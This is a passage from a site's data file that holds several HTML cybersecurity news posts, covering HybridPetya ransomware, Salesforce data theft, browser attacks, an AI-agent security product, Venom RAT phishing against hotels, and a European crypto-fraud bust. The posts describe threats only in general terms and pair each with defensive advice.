        <li>🧾 Log verifications and maintain audit trails for important content decisions.</li>
        <li>🔐 Consider enterprise policies around attribution to avoid exposing sensitive creator identities.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#083d51,#0b5567); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#7fffd4;">✅ Actionable Recommendations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Adopt C2PA verification in content pipelines for critical channels (news, legal, enterprise comms).</li>
        <li>✔️ Educate users and editors about what provenance proves — and what it doesn’t.</li>
        <li>✔️ Work with vendors to maintain signature verification services and key revocation processes.</li>
        <li>✔️ Combine provenance with automated content analysis (AI-detection + context signals) for higher confidence.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#062a35,#0b3d47); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🚀 Final Thoughts</h3><br>
      <p>
        The Pixel 10’s C2PA rollout signals a practical path toward trustworthy media at scale.  
        While provenance won’t eliminate deception overnight, it gives platforms and users a verifiable signal that can greatly reduce misinformation and abuse of synthetic media.  
        For organizations, the near-term priority is to integrate provenance checks, preserve metadata, and combine cryptographic signals with smart content analysis.
      </p>
    </section>
  `},{id:"hybridpetya-ransomware-2025",title:"HybridPetya: The Ransomware That Breaks Secure Boot",summary:"A new strain bypasses UEFI protections, encrypts entire systems, and demands $1,000 in Bitcoin",date:"2025-09-14",author:"EthicalByte",tags:["Ransomware","HybridPetya","UEFI","Secure Boot","Malware"],imageKey:"hybridPetyaBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1b2735,#090a0f); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff5252;">⚠ HybridPetya — A Ransomware Evolution</h3><br>
      <p>
        A new ransomware strain, <b>HybridPetya</b>, has emerged with a chilling capability: it can 
        <b>bypass Secure Boot protections</b> on modern PCs and embed itself into the <b>UEFI firmware</b>.  
        Victims are shown a fake <b>CHKDSK repair screen</b> before being hit with a <b>$1,000 Bitcoin demand</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c5364,#203a43); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 How HybridPetya Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🖥 Exploits <b>Secure Boot vulnerabilities</b> to execute before the OS loads</li>
        <li>⚡ Infects the <b>UEFI firmware</b>, ensuring persistence beyond reinstalls</li>
        <li>🔒 Encrypts entire drives — not just files — leaving systems unusable</li>
        <li>💰 Displays ransom note demanding <b>$1,000 in Bitcoin</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#90caf9;">🚨 Why This Threat Is Alarming</h3><br>
      <p>
        Traditional ransomware encrypts files after boot. <b>HybridPetya goes deeper</b> — it hijacks  
        the system before the operating system even starts, making recovery nearly impossible.  
        Security researchers warn that <b>Secure Boot bypass attacks are becoming more frequent</b>, 
        signaling a dangerous new era of ransomware evolution.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#1565c0;">🛡 Defenses Against HybridPetya</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Keep <b>firmware and BIOS</b> updated to patch Secure Boot vulnerabilities</li>
        <li>✅ Enable <b>hardware-based security features</b> like TPM</li>
        <li>✅ Use <b>advanced endpoint protection</b> with firmware scanning</li>
        <li>✅ Maintain <b>offline, encrypted backups</b> to recover without paying</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#090a0f,#1b2735); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff5252;">💀 Final Thoughts</h3><br>
      <p>
        <b>HybridPetya</b> represents a new class of ransomware — one that attacks the very foundation of your system.  
        With Secure Boot and UEFI under siege, <b>prevention is critical</b>. Once infected, even wiping the OS may not be enough.  
        This is not just ransomware — it’s <b>ransomware redefined</b>.
      </p>
    </section>
  `},{id:"fbi-salesforce-raids-2025",title:"FBI Warns: Hackers Raiding Salesforce to Steal Data",summary:"UNC6040, UNC6395, and known groups like ShinyHunters, LAPSUS$, and Scattered Spider are behind the campaigns.",date:"2025-09-15",author:"EthicalByte",tags:["FBI Alert","Salesforce Breach","Token Theft","Phishing","Cybercrime Groups"],imageKey:"fbiSalesforceBreach",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 FBI Alert: Salesforce Under Siege</h3><br>
      <p>
        The FBI has issued a new warning about <b>ongoing Salesforce data raids</b>, carried out by advanced 
        threat actors <b>UNC6040</b> and <b>UNC6395</b>. Using <b>stolen tokens, phishing calls, and custom malware</b>, 
        these hackers are breaching enterprise Salesforce instances to steal sensitive data and extort victims.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#eaeaea; margin-top:15px;">
      <h3 style="color:#ffca28;">🕵️ The Threat Actors</h3><br>
      <p>
        Investigators have tied the activity to cybercrime collectives including <b>ShinyHunters</b>, <b>LAPSUS$</b>, 
        and <b>Scattered Spider</b>. These groups briefly announced their "retirement," but the FBI cautions that such 
        claims are rarely trustworthy. Instead, they may be reorganizing and evolving their operations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#000428,#004e92); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#90caf9;">⚙️ How the Attacks Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Theft of <b>OAuth tokens</b> to gain persistent access</li>
        <li>📞 <b>Phishing calls</b> to trick employees into handing over credentials</li>
        <li>🛠 <b>Custom exploitation tools</b> tailored for Salesforce environments</li>
        <li>📤 Large-scale data exfiltration followed by extortion attempts</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#ddd; margin-top:15px;">
      <h3 style="color:#34d399;">🌍 Impact on Organizations</h3><br>
      <p>
        The raids are not just about stolen customer data — they also compromise <b>licensing details</b>, 
        <b>support case text</b>, and other sensitive business information. This enables attackers to not only extort 
        companies but also weaponize stolen insights against customers and partners.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Rotate and monitor <b>OAuth tokens</b> regularly</li>
        <li>✔️ Enable <b>multi-factor authentication (MFA)</b> across Salesforce accounts</li>
        <li>✔️ Train employees to detect <b>phishing attempts</b> over calls & emails</li>
        <li>✔️ Monitor for <b>unusual API calls or large data exports</b></li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243B55,#141E30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d4d;">⚡ Final Thoughts</h3><br>
      <p>
        The FBI’s warning makes one thing clear: <b>retired hacker groups don’t retire</b>.  
        They rebrand, regroup, and return stronger.  
        Enterprises must strengthen defenses around SaaS platforms like Salesforce — because attackers know 
        this is where the crown jewels are kept.
      </p>
    </section>
  `},{id:"browser-attacks-rising-2025",title:"Browser Attacks Surge as Hackers Exploit the Weakest Link",summary:"From MFA-bypassing phishing kits to malicious extensions — your browser is the new frontline.",date:"2025-09-16",author:"EthicalByte",tags:["Browser Security","Phishing","Malware","MFA Bypass","Cyber Threats"],imageKey:"browserAttacks2025Banner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141e30,#243b55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff9800;">🚨 Browsers Under Siege</h3><br>
      <p>
        Cybersecurity researchers are raising alarms as <b>browser-based attacks</b> skyrocket in 2025.  
        From <b>Snowflake</b> to <b>Salesforce</b>, attackers are exploiting the browser as their new weapon of choice —  
        bypassing security controls, stealing data, and planting malware.  
        The humble browser has become the <b>weakest link in enterprise defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#333333); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#03a9f4;">🛑 Key Tactics Attackers Use</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🎣 <b>Phishing Kits</b> — Fake login pages that bypass multi-factor authentication (MFA).</li>
        <li>⚡ <b>ClickFix Attacks</b> — Tricks users into clicking prompts that execute hidden malware.</li>
        <li>🧩 <b>Malicious Extensions</b> — Trojanized browser add-ons that sneak past official web stores.</li>
      </ul>
      <p>
        These methods exploit human trust and browser permissions — not just software vulnerabilities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#4caf50;">🌍 Real-World Impact</h3><br>
      <p>
        Security teams are reporting <b>massive data breaches</b> linked to browser attacks.  
        Compromised sessions give attackers access to corporate SaaS platforms,  
        cloud dashboards, and even financial systems.  
        In several cases, attackers bypassed traditional security solutions completely by <b>living inside the browser</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d32f2f;">🛡️ Defense Against Browser Attacks</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy <b>browser isolation</b> and zero-trust browsing solutions.</li>
        <li>✔️ Restrict <b>browser extensions</b> to pre-approved, verified add-ons.</li>
        <li>✔️ Train employees to recognize <b>ClickFix prompts</b> and fake login flows.</li>
        <li>✔️ Monitor <b>session hijacking</b> and anomalous logins across SaaS platforms.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243b55,#141e30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff9800;">✅ Final Thoughts</h3><br>
      <p>
        The browser is no longer just a tool — it’s the <b>primary attack surface</b>.  
        As phishing kits evolve and malicious extensions multiply,  
        organizations must rethink browser security as a <b>core part of cyber defense</b>.  
        In 2025, <b>your biggest breach may start with just one click</b>.
      </p>
    </section>
  `},{id:"ai-agent-security-astrix-2025",title:"Securing the Agentic Era: Astrix Launches AI Agent Control Plane",summary:"As AI agents outnumber employees 100:1, Astrix steps in to protect companies from invisible risks",date:"2025-09-17",author:"EthicalByte",tags:["AI Agents","Cybersecurity","Identity Security","Astrix","Automation Risks"],imageKey:"aiAgentControlBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🚨 The AI Identity Crisis</h3><br>
      <p>
        A staggering <b>80% of companies</b> have already faced <b>AI agent mishaps</b> — from unauthorized access 
        to accidental data leaks. The problem? <b>Non-human identities</b> such as bots, service accounts, and AI agents 
        now outnumber human employees <b>100:1</b>.  
        Without visibility and control, organizations are sleepwalking into a massive security gap.
      </p>
      <p>
        Unlike human users, these agents operate 24/7, make autonomous decisions, and often interact with sensitive 
        APIs and databases. That means even a single misconfigured or compromised agent could cause 
        <b>damage at machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧩 Why Traditional Security Fails</h3><br>
      <p>
        Firewalls and MFA protect <b>humans</b>, but they aren’t built for <b>autonomous AI agents</b> operating 
        inside networks, apps, and APIs.  
        These agents can create hidden risks by <b>sharing sensitive data, misusing privileges, 
        or executing tasks without oversight</b>.
      </p>
      <p>
        Traditional IAM (Identity & Access Management) tools simply can’t keep up with 
        the <b>scale, speed, and invisibility</b> of agent-to-agent interactions. 
        This gap has become the new frontier for attackers.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Astrix’s AI Agent Control Plane</h3><br>
      <p>
        Astrix has launched the <b>world’s first AI Agent Control Plane</b>, a dedicated platform for 
        securing non-human identities.  
        Key features include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Visibility</b> into every AI agent and service account across the enterprise</li>
        <li>✅ <b>Policy enforcement</b> for limiting data access and privileges</li>
        <li>✅ <b>Real-time monitoring</b> to catch suspicious AI behavior before damage occurs</li>
        <li>✅ <b>Automated remediation</b> for instantly revoking risky permissions</li>
      </ul>
      <p>
        This isn’t just security for today — it’s infrastructure for the <b>next decade of automation</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As companies rush into the <b>agentic era</b>, the risks posed by autonomous AI systems will only grow.  
        Without guardrails, AI agents can expose organizations to <b>compliance failures, insider threats, 
        and large-scale breaches</b>.
      </p>
      <p>
        Remember — it’s not just about stopping external hackers.  
        The danger comes from inside, where AI agents <b>already have permissions and authority</b>.  
        Astrix provides a much-needed safety net for enterprises adopting AI at scale.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        The security perimeter has shifted — from people to <b>agents</b>.  
        Organizations must treat AI identities with the same rigor as human ones.  
        The Astrix AI Agent Control Plane might just become the blueprint for <b>AI-era identity security</b>.
      </p>
      <p>
        In short: if you’re deploying AI at scale without agent identity controls, 
        you’re not just unprepared — you’re already <b>exposed</b>.
      </p>
    </section>
  `},{id:"ta558-venom-revengehotels-2025",title:"Venom RAT & LLM Phishing: TA558 Targets Hotels to Steal Guest Data",summary:"RevengeHotels (TA558) uses AI-written phishing in Spanish/Portuguese to deliver Venom RAT that steals cards, kills Defender & spreads via USB.",date:"2025-09-18",author:"EthicalByte",tags:["TA558","Venom RAT","Hotel Security","LLM Phishing","Payment Card Theft","USB Spread"],imageKey:"venomHotelBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#041726,#0b3a4a); border-radius:12px; color:#eef8ff;">
      <h3 style="color:#ff7a59;">🏨 AI-driven Hotel Attacks: Venom RAT on the Move</h3><br>
      <p>
        A cybercrime group tracked as <b>TA558 (aka RevengeHotels)</b> has launched targeted attacks against hotels across the region using <b>LLM-generated phishing emails in Portuguese and Spanish</b>. 
        The lure is tailored to hospitality staff and contractors — realistic, localized messages that bypass normal suspicion.
      </p>
      <p>
        The payload: <b>Venom RAT</b> — a $650 commodity remote-access trojan that steals guest credit-card data, disables Microsoft Defender, and can propagate via removable media (USB). 
        The combination of AI-written social engineering and a cheap, effective RAT makes this campaign both scalable and dangerous.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0e3a47,#073241); border-radius:12px; color:#dff6ff; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How the Campaign Operates</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✉️ <b>LLM-crafted phishing emails</b> in native languages to increase click-through and reduce suspicion</li>
        <li>📎 Malicious attachments or links that drop the Venom RAT downloader</li>
        <li>🛡 Venom RAT disables Windows Defender/AV to avoid detection and maintain persistence</li>
        <li>🔌 Lateral spread via <b>infected USB drives</b> (especially dangerous in hospitality where USBs are commonly used for devices and kiosks)</li>
        <li>💳 Targeted exfiltration of POS and guest payment card data for resale or fraud</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#072b36,#0d2130); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔍 Why Hotels Are an Attractive Target</h3><br>
      <p>
        Hotels hold a high density of payment card transactions, third-party vendors, and transient devices — a perfect storm for attackers:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>High volume of cardholder data passing through POS systems and reservations platforms</li>
        <li>Frequent use of removable media, kiosks, and shared workstations</li>
        <li>Multiple third-party integrations (cleaning, catering, booking platforms) that increase the attack surface</li>
        <li>Often limited cybersecurity staffing and variable patching practices across properties</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#14323b,#09252b); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#ffb86b;">🛡️ Immediate Mitigations (What Hotels Must Do Now)</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ <b>Harden endpoints:</b> enforce EDR with tamper-protection and block known Venom RAT indicators</li>
        <li>✔️ <b>Preserve AV integrity:</b> prevent unauthorized disabling of Defender via policy and monitoring</li>
        <li>✔️ <b>Lock down removable media:</b> implement USB allowlisting or disable autorun and unneeded USB ports</li>
        <li>✔️ <b>Segment POS systems:</b> isolate payment environments from general corporate networks and guest Wi-Fi</li>
        <li>✔️ <b>Language-aware phishing training:</b> simulate local-language phishing and train staff to spot LLM-crafted messages</li>
        <li>✔️ <b>Vendor security checks:</b> vet third-party integrations and enforce least privilege for vendor accounts</li>
      </ul>
      <p>
        Prioritize rapid detection and containment: in Venom RAT incidents, early isolation of infected hosts and credential resets reduce downstream exposure.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#06202a,#04161d); border-radius:12px; color:#dff8ff; margin-top:15px;">
      <h3 style="color:#ffd166;">📈 Longer-Term Controls</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔐 Adopt strong MFA and short-lived API keys for all vendor/service accounts</li>
        <li>🔎 Implement continuous threat hunting focused on lateral movement and USB-based spread patterns</li>
        <li>🧾 Maintain robust logging and centralized SIEM to detect odd processes or Defender tampering</li>
        <li>🤝 Share IoCs and attack patterns with hospitality sector peers and CERTs</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#08161b,#0b2a33); border-radius:12px; color:#eefbff; margin-top:15px;">
      <h3 style="color:#ff7a59;">✅ Final Take</h3><br>
      <p>
        TA558’s campaign is an example of how cheap commodity malware + LLM social engineering creates a highly scalable threat to the hospitality industry.  
        Hotels must treat AI-crafted social engineering as a real operational risk and lock down endpoints, removable media, and payment environments — fast.
      </p>
      <p style="font-size:0.9em; color:#bcdbe6;">Source: TheHackerNews — https://thehackernews.com/2025/09/ta558-uses-ai-generated-scripts-to.html</p>
    </section>
  `},{id:"ai-quantum-cybersecurity-2025",title:"AI + Quantum: The Next Frontier in Cybersecurity",summary:"Great potential, greater risks — experts warn of a new era of cyber challenges",date:"2025-09-19",author:"EthicalByte",tags:["AI","Quantum Computing","Cybersecurity","Webinar","Future Tech"],imageKey:"aiQuantumCyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🤖⚛ When AI Meets Quantum</h3><br>
      <p>
        AI and Quantum Computing are converging to reshape technology — and cybersecurity is at the heart of this evolution.  
        Together, they promise breakthroughs in <b>drug discovery, logistics, encryption, and national security</b>.  
        But they also introduce a whole new category of <b>unpredictable risks</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 The Dual-Edged Sword</h3><br>
      <p>
        While Quantum can <b>crack today’s encryption</b>, it can also power the <b>next generation of quantum-safe cryptography</b>.  
        Meanwhile, AI amplifies both sides — accelerating defenses but also helping attackers build smarter exploits, faster phishing campaigns, and <b>adaptive malware</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#28313b,#485563); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Why It Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ Quantum may render RSA & ECC obsolete within the decade.</li>
        <li>🤖 AI-driven attackers can weaponize deepfakes, zero-days, and automated social engineering.</li>
        <li>🔐 Together, AI + Quantum redefine <b>trust, privacy, and digital resilience</b>.</li>
      </ul>
    </section>


    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#00e5ff;">✅ Final Thoughts</h3><br>
      <p>
        The AI + Quantum revolution is here.  
        It holds <b>incredible potential</b> but also opens the door to <b>unprecedented risks</b>.  
        The only way forward is to stay informed, build resilience, and prepare for a future where <b>trust is quantum-proof</b>.
      </p>
    </section>
  `},{id:"sap-sovereign-cloud-india-2025",title:"SAP Launches Sovereign Cloud in India to Boost Digital Future",summary:"Empowering governments and enterprises with data sovereignty, compliance, and AI-ready infrastructure for a self-reliant digital future.",date:"2025-09-22",author:"EthicalByte",tags:["SAP","Sovereign Cloud","India","Data Sovereignty","Cloud Security","Digital Transformation"],imageKey:"sapSovereignCloudIndia",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#002b36,#003f5c); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🇮🇳 A Big Leap in Digital Sovereignty</h3><br>
      <p>
        SAP has officially launched its <b>Sovereign Cloud in India</b>, a major milestone in the nation’s push toward 
        <b>digital self-reliance</b>. This cloud infrastructure ensures that <b>critical data stays within Indian borders</b>, 
        addressing concerns around data sovereignty, compliance, and resilience.  
      </p>
      <p>
        By combining <b>local data control</b> with global cloud innovation, SAP is enabling India to build a secure, 
        future-ready digital backbone that aligns with national priorities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffca28;">☁ What Makes It Different?</h3><br>
      <p>
        The Sovereign Cloud goes beyond traditional hosting solutions. It introduces:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Data residency</b>: Information is fully processed and stored within India’s jurisdiction.</li>
        <li>✅ <b>Flexible deployments</b>: Options include on-premise, trusted partners, and hyperscalers like AWS — but always under Indian law.</li>
        <li>✅ <b>Regulatory alignment</b>: Compliant with India’s <b>DPDP Act</b> and sector-specific regulations.</li>
        <li>✅ <b>AI-ready foundation</b>: Designed to support next-gen technologies like <b>AI, ML, and analytics</b> securely.</li>
      </ul>
      <p>
        This positions India as one of the first countries to combine sovereignty with <b>cutting-edge innovation at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Why Sovereign Cloud Matters</h3><br>
      <p>
        In today’s interconnected world, <b>data is power</b>. With rising cyber threats, foreign surveillance risks, 
        and increasing compliance demands, <b>keeping sensitive data within borders</b> has become a necessity.  
      </p>
      <p>
        Sovereign Cloud provides governments, enterprises, and regulators with the confidence that their 
        <b>critical data is secure, compliant, and locally controlled</b>.  
        This is crucial in industries like <b>finance, healthcare, energy, and defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🌍 Real-World Impact</h3><br>
      <p>
        SAP’s Sovereign Cloud in India is more than just infrastructure — it’s a <b>national enabler</b>:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏛 <b>Governments</b>: Ensure e-governance data remains in-country, supporting citizen trust.</li>
        <li>💳 <b>Financial sector</b>: Protect sensitive banking records, payment data, and ensure RBI compliance.</li>
        <li>🏥 <b>Healthcare</b>: Store and analyze patient data securely while enabling AI-powered diagnostics.</li>
        <li>🏭 <b>Enterprises</b>: Accelerate digital transformation without fear of compliance failures.</li>
      </ul>
      <p>
        Together, these capabilities strengthen <b>India’s position as a global digital leader</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🚀 Final Thoughts</h3><br>
      <p>
        With the launch of <b>SAP Sovereign Cloud in India</b>, the country is taking a decisive step toward 
        <b>digital sovereignty</b>.  
        By blending global innovation with <b>local trust and compliance</b>, India is ensuring its digital economy 
        is <b>resilient, future-proof, and secure</b>.  
      </p>
      <p>
        This is not just about technology — it’s about <b>empowering India’s digital future</b>.
      </p>
    </section>
  `},{id:"autonomous-ai-cybersecurity-2025",title:"Agents Of Change: The Rise Of Autonomous AI In Cybersecurity",summary:"Autonomous AI systems are reshaping cybersecurity by analyzing data at scale, detecting patterns, and responding in real time to evolving threats.",date:"2025-09-23",author:"EthicalByte",tags:["Autonomous AI","Cybersecurity","Threat Detection","AI Security","Future Tech"],imageKey:"autonomousAICyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">⚡ A New Era of Defense</h3><br>
      <p>
        Autonomous AI systems are no longer experimental — they are becoming the <b>core of modern cybersecurity</b>.  
        Unlike traditional tools that rely on human response times, these systems can <b>analyze massive datasets instantly</b>, 
        detect subtle anomalies, and respond to threats at <b>machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔑 What Makes It Different</h3><br>
      <p>
        Human security teams can only scale so far.  
        Autonomous AI augments their capabilities by:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Analyzing vast amounts of telemetry data</b> in real time</li>
        <li>✅ <b>Identifying attack patterns</b> invisible to the human eye</li>
        <li>✅ <b>Responding instantly</b> before attackers can escalate</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Real-World Impact</h3><br>
      <p>
        From <b>banking systems</b> to <b>critical infrastructure</b>, autonomous AI is already 
        helping organizations stay ahead of <b>sophisticated cyber attacks</b>.  
        With threat actors adopting AI themselves, this technology has shifted from 
        an innovation to a <b>necessity</b>.
      </p>
      <p>
        PwC research highlights how <b>AI + cybersecurity</b> are converging to redefine risk management and resilience.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As <b>quantum computing</b>, <b>autonomous agents</b>, and <b>AI-driven malware</b> emerge,  
        organizations must embrace autonomous AI not just as a tool, but as a <b>strategic shield</b>.  
        Without it, defenders risk falling behind in an arms race that is accelerating every day.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        Cybersecurity is no longer about reacting — it’s about <b>predicting and preventing</b>.  
        Autonomous AI marks a turning point, where defense systems don’t just wait for alerts,  
        they <b>act first</b>.  
        This is the future of safeguarding digital assets and infrastructure.
      </p>
    </section>
  `},{id:"europe-crypto-scam-bust-2025",title:"Europe Cracks Down on €100M Crypto Scam",summary:"A multinational crackdown exposes a crypto fraud ring spanning 23 countries, marking one of Europe’s largest financial cybercrime busts.",date:"2025-09-24",author:"EthicalByte",tags:["Crypto Scam","Fraud","Cybercrime","Europe","Eurojust"],imageKey:"europeCryptoScam2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 €100M Crypto Scam Exposed</h3><br>
      <p>
        A coordinated European investigation has <b>brought down a crypto scam worth €100 million</b>.  
        Since 2018, five suspects orchestrated a sophisticated fraud scheme, luring victims in  
        <b>23 different countries</b> with the promise of guaranteed investment returns—before  
        disappearing with their money.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 Inside the Fraud Operation</h3><br>
      <p>
        The criminals created <b>fake investment platforms</b> designed to look legitimate,  
        convincing victims to deposit large sums. Once the money was transferred,  
        the platforms vanished—along with the criminals behind them.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📉 False promises of “guaranteed profits”</li>
        <li>🌍 Victims spread across Europe and beyond</li>
        <li>⛔ Criminals vanished after cashing out deposits</li>
      </ul>
      <p>
        Authorities confirmed <b>five arrests</b> in a joint Europol-Eurojust operation.  
        Bank accounts and assets tied to the scam have already been frozen.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Why This Bust Matters</h3><br>
      <p>
        This crackdown is one of <b>Europe’s largest crypto fraud takedowns</b>,  
        proving how global cooperation is vital against cross-border financial cybercrime.  
        Thousands of victims can now see justice as assets are recovered and operations dismantled.  
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#fafafa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Lessons Learned</h3><br>
      <p>
        If an investment promises <b>risk-free high returns</b>, it’s almost always a scam.  
